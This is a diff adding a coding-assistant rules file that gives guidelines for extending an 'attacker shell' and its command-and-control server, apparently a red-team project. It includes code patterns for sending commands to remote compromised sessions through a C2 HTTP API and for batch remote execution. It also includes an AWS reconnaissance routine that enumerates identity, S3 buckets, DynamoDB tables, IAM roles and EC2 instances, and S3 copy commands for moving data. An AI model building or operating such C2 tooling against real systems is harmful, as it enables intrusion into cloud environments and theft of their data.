@@ -1,0 +1,366 @@
+---
+description: Guidelines for adding new commands and API endpoints
+globs: src/attacker_shell.py, terraform/c2-server/dns_server_with_api.py
+alwaysApply: false
+---
+
+# Command Development Guidelines
+
+## **Adding New Commands**
+
+### **Operator Shell Commands** (`src/attacker_shell.py`)
+- **Location**: Add to `AttackerShell` class
+- **Pattern**: `cmd_<command_name>` method
+- **Documentation**: Include help text and usage examples
+
+### **HTTP API Endpoints** (`terraform/c2-server/dns_server_with_api.py`)
+- **Location**: Add to `APIHandler` class
+- **Pattern**: Handle in `do_POST` or `do_GET` methods
+- **Documentation**: Include endpoint description and parameters
+
+## **Command Development Workflow**
+
+### **1. Design the Command**
+```python
+def cmd_new_feature(self, args):
+    """
+    Description of what the command does.
+    
+    Usage: new-feature [options]
+    Options:
+        --option1    Description of option1
+        --option2    Description of option2
+    
+    Examples:
+        new-feature --option1 value1
+        new-feature --option2 value2
+    """
+    # Implementation here
+```
+
+### **2. Add HTTP API Endpoint**
+```python
+class APIHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        if self.path == '/api/new-feature':
+            # Parse request body
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+            
+            # Process request
+            result = self.server.resolver.handle_new_feature(data)
+            
+            # Send response
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps(result).encode('utf-8'))
+```
+
+### **3. Add Server Logic**
+```python
+class C2Resolver:
+    def handle_new_feature(self, data):
+        """Handle new feature request from HTTP API."""
+        # Implementation here
+        return {"status": "success", "data": result}
+```
+
+### **4. Update Help System**
+```python
+def cmd_help(self, args):
+    """Show available commands."""
+    commands = {
+        'whoami': 'Show current user',
+        'aws sts get-caller-identity': 'Show AWS identity',
+        'new-feature': 'Description of new feature',
+        # ... other commands
+    }
+    # Display help
+```
+
+## **Command Categories**
+
+### **System Commands**
+- **Purpose**: Basic system information and control
+- **Examples**: `whoami`, `pwd`, `ls`, `ps`
+- **Implementation**: Direct subprocess execution
+
+### **AWS Commands**
+- **Purpose**: AWS service interaction and IAM role exploitation
+- **Examples**: `aws sts get-caller-identity`, `aws s3 ls`, `aws dynamodb scan`
+- **Implementation**: Direct subprocess execution with AWS CLI
+
+### **C2 Commands**
+- **Purpose**: Command and control functionality
+- **Examples**: `logs`, `status`, `terminate`
+- **Implementation**: HTTP API calls to C2 server
+
+### **Utility Commands**
+- **Purpose**: Helper functions and debugging
+- **Examples**: `help`, `version`, `debug`
+- **Implementation**: Local processing or API calls
+
+## **Command Implementation Patterns**
+
+### **Simple Commands** (Direct execution)
+```python
+def cmd_whoami(self, args):
+    """Show current user."""
+    self.session_manager.send_command(self.current_session, "whoami")
+    # Output will be displayed automatically
+```
+
+### **Complex Commands** (With options)
+```python
+def cmd_aws_s3_ls(self, args):
+    """List S3 buckets or objects."""
+    if args:
+        # List objects in specific bucket
+        command = f"aws s3 ls s3://{args[0]}"
+    else:
+        # List all buckets
+        command = "aws s3 ls"
+    
+    self.session_manager.send_command(self.current_session, command)
+```
+
+### **Interactive Commands** (With user input)
+```python
+def cmd_aws_s3_cp(self, args):
+    """Copy S3 object to local or vice versa."""
+    if len(args) < 2:
+        print("Usage: aws-s3-cp <source> <destination>")
+        return
+    
+    source, destination = args[0], args[1]
+    command = f"aws s3 cp {source} {destination}"
+    self.session_manager.send_command(self.current_session, command)
+```
+
+### **C2 Server Commands** (HTTP API)
+```python
+def cmd_logs(self, args):
+    """View client debug log."""
+    try:
+        log_content = self.ci_client.read_log_file()
+        if log_content:
+            print("Client Log:")
+            print(log_content)
+        else:
+            print("[!] Could not read log file")
+    except Exception as e:
+        print(f"[!] Error reading log: {e}")
+```
+
+## **API Endpoint Patterns**
+
+### **Command Endpoints**
+```python
+# POST /api/command
+{
+    "session_id": "sess_abc123",
+    "command": "whoami"
+}
+```
+
+### **Status Endpoints**
+```python
+# GET /api/status
+{
+    "status": "running",
+    "sessions": ["sess_abc123", "sess_def456"],
+    "uptime": "2h 30m"
+}
+```
+
+### **Data Endpoints**
+```python
+# GET /api/output
+{
+    "outputs": [
+        {
+            "session_id": "sess_abc123",
+            "command": "whoami",
+            "output": "root",
+            "timestamp": "2025-01-19T10:30:00Z"
+        }
+    ]
+}
+```
+
+## **Error Handling**
+
+### **Command Errors**
+```python
+def cmd_aws_command(self, args):
+    """Execute AWS command with error handling."""
+    try:
+        command = f"aws {' '.join(args)}"
+        self.session_manager.send_command(self.current_session, command)
+    except Exception as e:
+        print(f"[!] Error executing AWS command: {e}")
+        print("Make sure AWS CLI is available in the sandbox")
+```
+
+### **API Errors**
+```python
+def send_command(self, session_id: str, command: str):
+    """Send command with error handling."""
+    try:
+        response = requests.post(
+            f"http://{self.server_ip}:8080/api/command",
+            json={"session_id": session_id, "command": command},
+            timeout=10
+        )
+        response.raise_for_status()
+        return True
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Failed to send command: {e}")
+        return False
+```
+
+## **Testing New Commands**
+
+### **Unit Tests**
+```python
+def test_cmd_whoami(self):
+    """Test whoami command."""
+    shell = AttackerShell()
+    # Mock session manager
+    shell.session_manager = Mock()
+    shell.current_session = "test_session"
+    
+    # Execute command
+    shell.cmd_whoami([])
+    
+    # Verify command was sent
+    shell.session_manager.send_command.assert_called_with("test_session", "whoami")
+```
+
+### **Integration Tests**
+```python
+def test_aws_command_integration(self):
+    """Test AWS command with real C2 server."""
+    # Start mock C2 server
+    # Send AWS command
+    # Verify command is received and processed
+    # Check output is returned
+```
+
+## **Documentation Requirements**
+
+### **Command Documentation**
+- **Description**: What the command does
+- **Usage**: Syntax and parameters
+- **Examples**: Common usage patterns
+- **Options**: Available flags and arguments
+- **Notes**: Special considerations or limitations
+
+### **API Documentation**
+- **Endpoint**: URL and HTTP method
+- **Parameters**: Request body schema
+- **Response**: Response body schema
+- **Errors**: Possible error codes and messages
+- **Examples**: Request/response examples
+
+## **Security Considerations**
+
+### **Input Validation**
+```python
+def cmd_aws_s3_cp(self, args):
+    """Copy S3 object with input validation."""
+    if len(args) < 2:
+        print("Usage: aws-s3-cp <source> <destination>")
+        return
+    
+    # Validate S3 paths
+    source, destination = args[0], args[1]
+    if not self._is_valid_s3_path(source) or not self._is_valid_s3_path(destination):
+        print("[!] Invalid S3 path format")
+        return
+    
+    command = f"aws s3 cp {source} {destination}"
+    self.session_manager.send_command(self.current_session, command)
+```
+
+### **Command Sanitization**
+```python
+def _sanitize_command(self, command: str) -> str:
+    """Sanitize command to prevent injection."""
+    # Remove dangerous characters
+    dangerous_chars = [';', '&', '|', '`', '$', '(', ')']
+    for char in dangerous_chars:
+        command = command.replace(char, '')
+    
+    return command.strip()
+```
+
+## **Performance Considerations**
+
+### **Long-Running Commands**
+```python
+def cmd_long_command(self, args):
+    """Execute long-running command with timeout."""
+    command = ' '.join(args)
+    
+    # Set timeout for long commands
+    self.session_manager.send_command(
+        self.current_session, 
+        command,
+        timeout=300  # 5 minutes
+    )
+```
+
+### **Batch Commands**
+```python
+def cmd_batch(self, args):
+    """Execute multiple commands in sequence."""
+    commands = args  # List of commands
+    for cmd in commands:
+        self.session_manager.send_command(self.current_session, cmd)
+        time.sleep(1)  # Brief pause between commands
+```
+
+## **Common Command Examples**
+
+### **System Information**
+```python
+def cmd_system_info(self, args):
+    """Show comprehensive system information."""
+    commands = [
+        "whoami",
+        "pwd",
+        "uname -a",
+        "ps aux",
+        "df -h",
+        "free -m"
+    ]
+    
+    for cmd in commands:
+        self.session_manager.send_command(self.current_session, cmd)
+```
+
+### **AWS Reconnaissance**
+```python
+def cmd_aws_recon(self, args):
+    """Perform AWS reconnaissance."""
+    commands = [
+        "aws sts get-caller-identity",
+        "aws s3 ls",
+        "aws dynamodb list-tables",
+        "aws iam list-roles",
+        "aws ec2 describe-instances"
+    ]
+    
+    for cmd in commands:
+        self.session_manager.send_command(self.current_session, cmd)
+```
+
+## **Related Documentation**
+
+- [CLAUDE.md](mdc:CLAUDE.md) - Command development overview
+- [src/attacker_shell.py](mdc:src/attacker_shell.py) - Operator shell implementation
+- [terraform/c2-server/dns_server_with_api.py](mdc:terraform/c2-server/dns_server_with_api.py) - HTTP API implementation
+- [testing.mdc](mdc:.cursor/rules/testing.mdc) - Testing guidelines
